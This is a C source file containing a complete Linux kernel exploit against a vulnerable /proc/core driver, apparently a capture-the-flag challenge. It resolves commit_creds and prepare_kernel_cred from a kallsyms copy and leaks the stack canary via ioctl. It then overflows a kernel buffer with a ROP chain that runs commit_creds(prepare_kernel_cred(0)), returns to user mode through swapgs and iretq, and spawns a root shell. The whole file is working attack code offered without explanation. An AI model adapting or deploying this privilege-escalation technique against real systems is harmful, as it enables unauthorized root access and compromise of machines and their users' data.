#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}


void get_shell(void){
    system("/bin/sh");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf, 0x30, kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			/* printf("hex: %s\n", hex); */
			sscanf(hex, "%llx", &commit_creds);
			printf("commit_creds addr: %p\n", commit_creds);
			vmlinux_base = commit_creds - 0x9c8e0;
			printf("vmlinux_base addr: %p\n", vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9cce0;
			/* printf("vmlinux_base addr: %p\n", vmlinux_base); */
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}

}


void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred;
	void (*cc)(char*) = commit_creds;
	(*cc)((*pkc)(0));
	/* puts("[*] root now."); */
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n", idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
	printf("[*]copy from user with size: %ld\n", size);
	ioctl(fd, 0x6677889A, size);
}


int main(void)
{
	find_symbols();
	size_t offset = vmlinux_base - raw_vmlinux_base;
	save_status();

	int fd = open("/proc/core",O_RDWR);
	set_off(fd, 0x40);
	size_t buf[0x40/8];
	core_read(fd, buf);
	size_t canary = buf[0];
	printf("[*]canary : %p\n", canary);

	size_t rop[0x30] = {0};
	rop[8] = canary ; 
	rop[10] = (size_t)get_root;
	rop[11] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
	rop[12] = 0;
	rop[13] = 0xffffffff81050ac2 + offset; // iretq; ret;
	rop[14] = (size_t)get_shell; 
	rop[15] = user_cs;
	rop[16] = user_rflags;
	rop[17] = user_sp;
	rop[18] = user_ss;

	puts("[*] DEBUG: ");
	getchar();
	write(fd, rop, 0x30 * 8);
	core_copy_func(fd, 0xffffffffffff0000 | (0x100));
}
